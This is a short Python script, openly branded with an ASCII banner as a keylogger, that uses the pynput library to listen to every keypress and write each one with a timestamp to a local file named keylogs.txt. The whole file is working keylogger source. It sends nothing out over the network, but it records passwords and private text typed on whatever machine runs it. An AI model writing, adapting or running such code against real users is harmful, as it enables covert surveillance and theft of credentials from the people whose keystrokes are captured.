def klogger():
    import os
    import subprocess
    subprocess.run('clear')
    print("""
    
    ░██████╗░░█████╗░██████╗░██╗░██████╗  ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
    ██╔════╝░██╔══██╗██╔══██╗╚█║██╔════╝  ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
    ██║░░██╗░██║░░██║██║░░██║░╚╝╚█████╗░  █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
    ██║░░╚██╗██║░░██║██║░░██║░░░░╚═══██╗  ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
    ╚██████╔╝╚█████╔╝██████╔╝░░░██████╔╝  ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
    ░╚═════╝░░╚════╝░╚═════╝░░░░╚═════╝░  ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝
    """)
    home_dir = os.system("cd ~")
    p2 = subprocess.run('pwd',stdout=subprocess.PIPE, text=True)
    print(p2.stdout)
    
    
    
    from pynput.keyboard import Key, Listener
    import logging

    log_dir = ""

    logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
        level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()